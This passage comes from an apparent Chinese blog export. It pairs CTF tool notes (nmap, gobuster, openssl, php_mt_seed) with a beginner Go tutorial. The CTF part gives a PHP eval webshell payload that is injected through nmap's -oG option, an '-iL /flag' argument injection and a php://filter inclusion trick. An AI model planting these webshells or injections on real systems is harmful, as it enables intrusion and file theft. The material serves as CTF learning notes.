class="string">[10.0.0.14]</span> <span class="number">9842</span> (?) : Connection refused</span><br><span class="line"></span><br><span class="line">也就是利用nc命令三次访问这<span class="number">3</span>个端口</span><br></pre></td></tr></table></figure>

<p>最后用<code>nmap</code>扫一下就看见<code>22</code>端口打开了</p>
<h2 id="9-openssl"><a href="#9-openssl" class="headerlink" title="9)openssl"></a>9)openssl</h2><h3 id="SSL-简介"><a href="#SSL-简介" class="headerlink" title="SSL 简介"></a>SSL 简介</h3><blockquote>
<p>按照我的理解来解释下，</p>
<p>为了让网络通信更安全，需要认证和加密，认证是说明你是要找的人，加密是为了让截获中间报文第三者无法得到消息内容。</p>
<p>为此有人设计了SSL，即套接字上的安全层，简单来说就是在TCP之上做一个安全通信层，HTTP on SSL 即是HTTPs，</p>
<p>现在几乎所有的银行网站访问都是基于HTTPS协议的。<br>认证是通过证书+非对称加密算法来解决的</p>
</blockquote>
<blockquote>
<p>openssl可以实现：秘钥证书管理、对称加密和非对称加密。</p>
</blockquote>
<p>举一个例子</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">openssl passwd -<span class="number">1</span> -salt salt password</span><br><span class="line">==&gt;</span><br><span class="line"><span class="variable">$1</span><span class="variable">$salt</span><span class="variable">$qJH7</span>.N4xYta3aEG<span class="regexp">/dfqo/</span><span class="number">0</span></span><br><span class="line"></span><br><span class="line">-<span class="number">1</span>使用什么哈希算法。在我们的用例中，这无关紧要，因此我们使用 MD5，在现实世界的 PT 中应该避免使用 MD5，因为它不安全。</span><br><span class="line"></span><br><span class="line">-salt salt用作盐的字符串。我选择字符串盐</span><br><span class="line"></span><br><span class="line">password我们想使用的明文密码</span><br></pre></td></tr></table></figure>

<h2 id="10-gobuster"><a href="#10-gobuster" class="headerlink" title="10)gobuster"></a>10)gobuster</h2><h3 id="爆破目录"><a href="#爆破目录" class="headerlink" title="爆破目录"></a>爆破目录</h3><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">gobuster</span> dir -w <span class="meta">common</span>.txt -u url</span><br></pre></td></tr></table></figure>

<h3 id="爆破子域名"><a href="#爆破子域名" class="headerlink" title="爆破子域名"></a>爆破子域名</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">gobuster</span> vhost -w subdomains-top1million-<span class="number">5000</span>.txt -u url</span><br></pre></td></tr></table></figure>

<h2 id="11-seed工具php-mt-seed"><a href="#11-seed工具php-mt-seed" class="headerlink" title="11)seed工具php_mt_seed"></a>11)seed工具php_mt_seed</h2><p>这里以一道题为例子讲解这个工具的使用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;seed.php&quot;</span>);</span><br><span class="line"><span class="comment">//mt_srand(*********);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: &quot;</span>.<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base|\.\./i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/NewStar/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="comment">//flag in `flag.php`</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Baby Hacker?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No Hacker!&quot;</span>;</span><br><span class="line">&#125; Hint: <span class="number">1219893521</span></span><br><span class="line">No Hacker!</span><br></pre></td></tr></table></figure>

<hr>
<p>搜索这两个函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mt_scrand</span>()</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>()  </span><br></pre></td></tr></table></figure>

<p><code>mt_scrand(seed)</code>这个函数的意思，是通过分发<code>seed</code>种子，然后种子有了后，靠<code>mt_rand()</code>生成随机数。</p>
<p>我们来写段代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">12345</span>);    </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>我们访问，输出<code>162946439</code>。</p>
<p>现在代码改为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">12345</span>);    </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure>

<p>我们再次访问:</p>
<blockquote>
<p>162946439</p>
<p>247161732</p>
<p>1463094264</p>
<p>1878061366</p>
<p>394962642</p>
</blockquote>
<p>发现<code>162946439</code>又出现了</p>
<blockquote>
<p>所以可以推断出随机数其实是可预测的，</p>
<p>它以一种线性的方式生成</p>
<p>知道种子和一组伪随机数不是就可以推y(伪随机数了吗),当然实际上更复杂肯定。</p>
<p>我知道种子后，可以确定你输出伪随机数的序列。<br>知道你的随机数序列，可以确定你的种子。 </p>
</blockquote>
<p>在我们的例题中，我们并不知道我们的种子是多少</p>
<p>但是它给出了我们种子的第一个随机数<code>1219893521</code></p>
<p>这个时候想要拿到种子的值，就需要大量反向的演算推导了</p>
<p>这个过程很庞大，所以这里就用到了工具【脚本】<code>php_mt_seed</code></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">time</span> ./php_mt_seed 第一个随机数  </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20221120141340099.png"><img src="/tooluse(Commontools)/image-20221120141340099.png" alt="image-20221120141340099"></a></p>
<p>于是我们就得到了我们的<code>seed</code></p>
<blockquote>
<p>1145146</p>
</blockquote>
<p>再分析源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: &quot;</span>.<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br></pre></td></tr></table></figure>

<p>这里在 echo处已经随机了一次，所以在底下比较的时候就算第二个随机数进行强类型比较</p>
<p>于是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="string">&quot;1145146&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"></span><br><span class="line">==&gt;<span class="number">1219893521</span>&lt;br&gt;<span class="number">1202031004</span></span><br></pre></td></tr></table></figure>

<p>得到<code>guess</code>参数的值<code>1202031004</code></p>
<p>对于最后对<code>file</code>文件包含语句的正则匹配绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base|\.\./i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/NewStar/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br></pre></td></tr></table></figure>

<p>大概就是不能出现<code>base</code>，然后参数中间要包含<code>/NewStar/</code>这一段</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">file</span>=php:<span class="comment">//filter</span></span><br></pre></td></tr></table></figure>

<h2 id="12-nmap"><a href="#12-nmap" class="headerlink" title="12)nmap"></a>12)nmap</h2><p><strong>Nmap输出格式</strong></p>
<ul>
<li>-oN (标准输出)</li>
<li>-oX (XML输出)</li>
<li>-oS (ScRipT KIdd|3 oUTpuT)</li>
<li>-oG (Grep输出)</li>
<li>-oA (输出至所有格式)</li>
</ul>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-O：激活操作探测；</span></span><br><span class="line"><span class="deletion">-P0：值进行扫描，不ping主机；</span></span><br><span class="line"><span class="deletion">-PT：是同TCP的ping；</span></span><br><span class="line"><span class="deletion">-sV：探测服务版本信息；</span></span><br><span class="line"><span class="deletion">-sP：ping扫描，仅发现目标主机是否存活；</span></span><br><span class="line"><span class="deletion">-ps：发送同步（SYN）报文；</span></span><br><span class="line"><span class="deletion">-PU：发送udp ping；</span></span><br><span class="line"><span class="deletion">-PE：强制执行直接的ICMPping；</span></span><br><span class="line"><span class="deletion">-PB：默认模式，可以使用ICMPping和TCPping；</span></span><br><span class="line"><span class="deletion">-6：使用IPv6地址；</span></span><br><span class="line"><span class="deletion">-v：得到更多选项信息；</span></span><br><span class="line"><span class="deletion">-d：增加调试信息地输出；</span></span><br><span class="line"><span class="deletion">-oN：以人们可阅读的格式输出；</span></span><br><span class="line"><span class="deletion">-oX：以xml格式向指定文件输出信息；</span></span><br><span class="line"><span class="deletion">-oM：以机器可阅读的格式输出；</span></span><br><span class="line"><span class="deletion">-A：使用所有高级扫描选项；</span></span><br><span class="line"><span class="deletion">--resume：继续上次执行完的扫描；</span></span><br><span class="line"><span class="deletion">-P：指定要扫描的端口，可以是一个单独的端口，用逗号隔开多个端口，使用“-”表示端口范围；</span></span><br><span class="line"><span class="deletion">-e：在多网络接口Linux系统中，指定扫描使用的网络接口；</span></span><br><span class="line"><span class="deletion">-g：将指定的端口作为源端口进行扫描；</span></span><br><span class="line"><span class="deletion">--ttl：指定发送的扫描报文的生存期；</span></span><br><span class="line"><span class="deletion">--packet-trace：显示扫描过程中收发报文统计；</span></span><br><span class="line"><span class="deletion">--scanflags：设置在扫描报文中的TCP标志。</span></span><br><span class="line"><span class="deletion">--send-eth/--send-ip 使用原始以太网发送/构造指定IP发送</span></span><br></pre></td></tr></table></figure>

<p>知识点：</p>
<p>利用-oG，可以将命令和结果写进文件</p>
<p>利用-iL 和-oN</p>
<p>其中-iL是从inputfilename文件中读取扫描的目标。在这个文件中要有一个主机或者网络的列表，由空格</p>
<p>键、制表键或者回车键作为分割符。</p>
<p>如果使用-iL-，nmap就会从标准输入stdin读取主机名字。你可以从指定目标一节得到</p>
<p>更加详细的信息，-oN是把扫描结果重定向到一个可读的文件logfilename中。</p>
<p>这道题还有escapeshellarg和escapeshellcmd函数；</p>
<p>它绕过了PHP；一句话木马就可以使用短标签：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">&lt;<span class="string">?=</span> <span class="variable">@eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="string">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>文件格式就可以使用phtml</p>
<p>paload：</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">&#x27;  </span><span class="language-php"><span class="meta">&lt;?=</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><span class="language-xml"> -oG shell.phtml &#x27;</span></span><br></pre></td></tr></table></figure>

<p>方法二 -iL</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#x27; -iL /flag -o 1 &#x27;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>daily</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>golang</title>
    <url>/Go/</url>
    <content><![CDATA[<p><code>主要从黄哥的资料笔记，尚硅谷，以及谢先斌大佬的笔记</code><strong><code>https://www.xiexianbin.cn/golang</code></strong></p>
<p><code>以及</code><strong><a href="https://exercism.org/">https://exercism.org/</a></strong><code>上面进行练习, 顺便推荐一本书《go黑帽子》</code></p>
<span id="more"></span>

<h2 id="GO语言概述"><a href="#GO语言概述" class="headerlink" title="GO语言概述"></a>GO语言概述</h2><blockquote>
<p>Go语言是谷歌2009年发布的第二款开源编程语言,它专门针对多处理器系统应用程序的编程进行了优化，它是一种系统语言其非常有用和强大,其程序可以媲美C或C++代码的速度，而且更加安全、支持并行进程。</p>
<p>Go支持面向对象，而且具有真正的闭包(closures)和反射 (reflection)等功能。</p>
<p>Go可以在不损失应用程序性能的情况下降低代码的复杂性。</p>
<p>Go是是静态强类型语言</p>
<p>Go语言开发者被叫做gopher，这个和信息查找系统gopher协议同名</p>
</blockquote>
<h2 id="Go语言特色"><a href="#Go语言特色" class="headerlink" title="Go语言特色"></a>Go语言特色</h2><blockquote>
<ul>
<li>简洁、快速、安全</li>
<li>并行、有趣、开源</li>
<li>内存管理、数组安全、编译迅速</li>
</ul>
</blockquote>
<h2 id="Go语言用途"><a href="#Go语言用途" class="headerlink" title="Go语言用途"></a>Go语言用途</h2><blockquote>
<p>Go 语言被设计成一门应用于搭载 Web 服务器，存储集群或类似用途的巨型中央服务器的系统编程<br>语言。对于高性能分布式系统领域而言，Go 语言无疑比大多数其它语言有着更高的开发效率。<br>它提供了海量并行的支持，这对于游戏服务端的开发而言是再好不过了。</p>
</blockquote>
<h2 id="Go语言编译过程"><a href="#Go语言编译过程" class="headerlink" title="Go语言编译过程"></a>Go语言编译过程</h2><p><a data-fancybox="gallery" data-src="/Go/image-20230117215732032.png"><img src="/Go/image-20230117215732032.png" alt="image-20230117215732032"></a></p>
<h2 id="可查看文档网站信息"><a href="#可查看文档网站信息" class="headerlink" title="可查看文档网站信息"></a>可查看文档网站信息</h2><blockquote>
<p>官网:<br><a href="https://golang.google.cn/">https://golang.google.cn/</a><br>API文档:<br><a href="https://golang.google.cn/doc/">https://golang.google.cn/doc/</a><br>教程:<br><a href="http://www.w3cschool.cn/go/go-tutorial.html">http://www.w3cschool.cn/go/go-tutorial.html</a><br>下载:<br><a href="https://golang.google.cn/dl/">https://golang.google.cn/dl/</a></p>
</blockquote>
<h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>基础概念将介绍三种主要的语言特性：<code>包、函数和变量</code></p>
<h3 id="Package"><a href="#Package" class="headerlink" title="Package"></a>Package</h3><blockquote>
<p><code>Go</code> 应用程序以包的形式组织。包是位于同一目录中的源文件的集合。目录中的所有源文件必须共享相同的包名称。包名称通常是导入路径中的最后一个目录。</p>
</blockquote>
<p>例如，</p>
<p><a href="https://golang.org/src/math/rand/">“math&#x2F;rand”包</a>中的文件以语句开头<code>package rand</code>。</p>
<blockquote>
<p>导入包时，只能使用&#x2F;访问名称以大写字母开头的实体（函数、类型、变量、常量）。Go 中推荐的命名风格是标识符将使用 命名<code>camelCase</code>，除了那些意味着可以跨包访问的标识符应该是<code>PascalCase</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lasagna</span><br></pre></td></tr></table></figure>

<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>Go 是静态类型的，这意味着所有变量在编译时都<a href="https://en.wikipedia.org/wiki/Type_system">必须具有定义的类型。</a></p>
<p>可以通过显式指定类型来定义变量：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> explicit <span class="type">int</span> <span class="comment">// 显式声明</span></span><br></pre></td></tr></table></figure>

<p>您还可以使用初始化器，编译器将分配变量类型以匹配初始化器的类型。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">implicit := <span class="number">10</span>   <span class="comment">// 隐式声明为int，自动分配类型</span></span><br><span class="line"><span class="comment">//也就是说可以利用 := 进行类型声明，其类型为其后数据的类型</span></span><br></pre></td></tr></table></figure>

<p>声明后，可以使用运算符为变量赋值<code>=</code>。一旦声明，变量的类型就永远不会改变。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">count := <span class="number">1</span> <span class="comment">// 赋初值</span></span><br><span class="line">count = <span class="number">2</span>  <span class="comment">// 更新新值</span></span><br><span class="line"></span><br><span class="line">count = <span class="literal">false</span> <span class="comment">// 由于分配了非“int”类型，这会引发编译器错误</span></span><br></pre></td></tr></table></figure>

<h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p>常量就像变量一样保存一段数据，但它们的值在程序执行过程中不能改变。</p>
<p>常量使用<code>const</code>关键字定义，可以是数字、字符、字符串或布尔值：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Age = <span class="number">21</span> <span class="comment">// 定义一个值为 21 的数值常量 &#x27;Age&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p><code>Go</code> 函数接受<code>零个或多个参数</code>。<strong>参数必须明确类型化，没有隐式声明类型。</strong></p>
<p><code>return</code>使用关键字从函数返回值。</p>
<p>通过指定函数名称并为函数的每个参数传递参数来调用函数。</p>
<blockquote>
<p>请注意，Go 支持两种类型的注释：</p>
<p>单行注释在前面，多行注释在和<code>//</code>之间插入。<code>/*``*/</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> greeting</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hello is a public function.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hello</span> <span class="params">(name <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> hi(name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hi is a private function.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hi</span> <span class="params">(name <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hi &quot;</span> + name</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="函数定义"><a href="#函数定义" class="headerlink" title="*函数定义"></a>*函数定义</h4><blockquote>
<p><code>func 函数名(形参列表) 返回类型列表 &#123;</code><br>  <code>函数体</code><br><code>&#125;</code></p>
<p>这里的返回类型列表是因为<code>返回值需要描述返回值类型</code></p>
</blockquote>
<h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h4><blockquote>
<p>函数可以通过 <code>函数名(实参列表)</code>，在调用过程中实参的每个数据会赋值给形参中的对应变量（实参列表类型和数量需要与形参一一对应）</p>
<p>【这和大部分代码的调用函数方法一样，不用多说】</p>
</blockquote>
<h4 id="基础函数示例"><a href="#基础函数示例" class="headerlink" title="*基础函数示例"></a>*基础函数示例</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 无参函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 有参函数，name 称为形参</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">helloSomeone</span><span class="params">(name <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Hello&quot;</span>, name, <span class="string">&quot;!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 有返回值函数</span></span><br><span class="line"><span class="comment">//func add(a int, b int) int &#123;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="comment">//函数声明中[a,b]存在多个相同类型[int]的连续形参，可以只保留最后一个形参的类型[a, b int]</span></span><br><span class="line">	<span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ExampleFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 无参函数调用</span></span><br><span class="line">	hello()</span><br><span class="line">	<span class="comment">// 函数的标识符为 func()，调用函数需要加 ()</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, hello)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 有参函数调用</span></span><br><span class="line">	helloSomeone(<span class="string">&quot;xianbin&quot;</span>) <span class="comment">// name = &quot;xianbin&quot; 为实参，调用函数时，传递给函数的形参</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, helloSomeone)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 有返回值函数调用</span></span><br><span class="line">	sum := add(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">	fmt.Println(sum)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, add)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 函数的类型</span></span><br><span class="line">	<span class="keyword">var</span> f <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span> <span class="type">int</span></span><br><span class="line">    <span class="comment">//函数[func(int, int) int]也可以赋值给变量[var f]，也可以当成实参[f(1, 2)]赋值给另一个函数[fmt.Println()]作为形参。</span></span><br><span class="line">	f = add</span><br><span class="line">	fmt.Println(f(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Output:</span></span><br><span class="line">	<span class="comment">//Hello World!</span></span><br><span class="line">	<span class="comment">//func()</span></span><br><span class="line">	<span class="comment">//Hello xianbin !</span></span><br><span class="line">	<span class="comment">//func(string)</span></span><br><span class="line">	<span class="comment">//3</span></span><br><span class="line">	<span class="comment">//func(int, int) int</span></span><br><span class="line">	<span class="comment">//3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h2><p>Go 包含基本的数字类型，可以表示整数或浮点值的集合。</p>
<p>这个概念将集中在两种数字类型上：</p>
<blockquote>
<ul>
<li><code>int</code>：例如<code>0</code>，，<code>255</code>。<code>2147483647</code>大小至少为 32 位的带符号整数（值范围：-2147483648 到 2147483647）。但这将取决于系统架构。大多数现代计算机都是 64 位的，因此<code>int</code>大小为 64 位（取值率为：-9223372036854775808 到 9223372036854775807）。</li>
<li><code>float64</code>：例如<code>0.0</code>，<code>3.14</code>。包含所有 64 位浮点数的集合。</li>
</ul>
</blockquote>
<p><code>+</code>Go 支持, <code>-</code>, <code>*</code>,<code>/</code> 和<code>%</code>（余数不取模）的标准算术运算符集。</p>
<p>在 Go 中，不同类型之间的赋值需要显式转换。例如，要将 an <code>int</code> 转换为 a <code>float64</code>，</p>
<p>您需要执行以下操作：<code>an := float64(a)</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">int</span> = <span class="number">42</span></span><br><span class="line">f := <span class="type">float64</span>(x)</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;x is of type: %s\n&quot;</span>, reflect.TypeOf(x))</span><br><span class="line"><span class="comment">// Output: x is of type: int</span></span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;f is of type: %s\n&quot;</span>, reflect.TypeOf(f))</span><br><span class="line"><span class="comment">// Output: f is of type: float64</span></span><br></pre></td></tr></table></figure>

<h3 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h3><p><code>Go</code>的计算符使用以及运算简写和大部分代码是一样</p>
<blockquote>
<p>对于整数除法，余数被丢弃（例如<code>5 / 2 == 2</code>），也是一样的</p>
<p>简写，如</p>
<p>a+&#x3D;5</p>
<p>a++</p>
<p>a–</p>
</blockquote>
<h4 id="不同类型的算术运算"><a href="#不同类型的算术运算" class="headerlink" title="不同类型的算术运算"></a>不同类型的算术运算</h4><p>在许多语言中，您可以对不同类型的变量执行算术运算，但在 Go 中，这会产生错误。例如：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">int</span> = <span class="number">42</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// this line produces an error</span></span><br><span class="line">value := <span class="type">float32</span>(<span class="number">2.0</span>) * x <span class="comment">// invalid operation: mismatched types float32 and int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// you must convert int type to float32 before performing arithmetic operation</span></span><br><span class="line">value := <span class="type">float32</span>(<span class="number">2.0</span>) * <span class="type">float32</span>(x)</span><br></pre></td></tr></table></figure>

<p>这是由于这样高精度和低精度进行计算，会导致精度丢失，需要先将低精度类型转化为高精度类型，再进行计算</p>
<h2 id="bool"><a href="#bool" class="headerlink" title="bool"></a>bool</h2><p>和大部分代码一样</p>
<p>Go 中的布尔值由<code>bool</code>类型表示。<code>bool</code>是<code>true</code>或<code>false</code>。</p>
<p>Go 支持三种布尔运算符：<code>!</code>(NOT)、<code>&amp;&amp;</code>(AND) 和<code>||</code>(OR)。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="literal">true</span> || <span class="literal">false</span> <span class="comment">// =&gt; true</span></span><br><span class="line"><span class="literal">true</span> &amp;&amp; <span class="literal">false</span> <span class="comment">// =&gt; false</span></span><br><span class="line">!<span class="literal">true</span> <span class="comment">// =&gt; false</span></span><br></pre></td></tr></table></figure>

<p>这三个布尔运算符各有不同的<em>运算符优先级</em>。因此，它们按以下顺序进行评估：<code>!</code>首先、<code>&amp;&amp;</code>第二和最后<code>||</code>。如果您想强制执行不同的顺序，您可以将布尔表达式括在圆括号中（即。<code>()</code>），因为圆括号具有更高的运算符优先级。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">!<span class="literal">true</span> &amp;&amp; <span class="literal">false</span>   <span class="comment">// =&gt; false</span></span><br><span class="line">!(<span class="literal">true</span> &amp;&amp; <span class="literal">false</span>) <span class="comment">// =&gt; true</span></span><br></pre></td></tr></table></figure>

<h3 id="if条件语句书写规范"><a href="#if条件语句书写规范" class="headerlink" title="if条件语句书写规范"></a>if条件语句书写规范</h3><p>如果习惯用</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// do something1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么在<code>Go</code>这里就行不通了，如果你按上面的格式进行书写，就会报错</p>
<blockquote>
<p><code>unexpected else</code></p>
</blockquote>
<p>你需要按照作者规定的格式，才会使得代码不显示错误</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// do something1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>if+else if</code>也是如此</p>
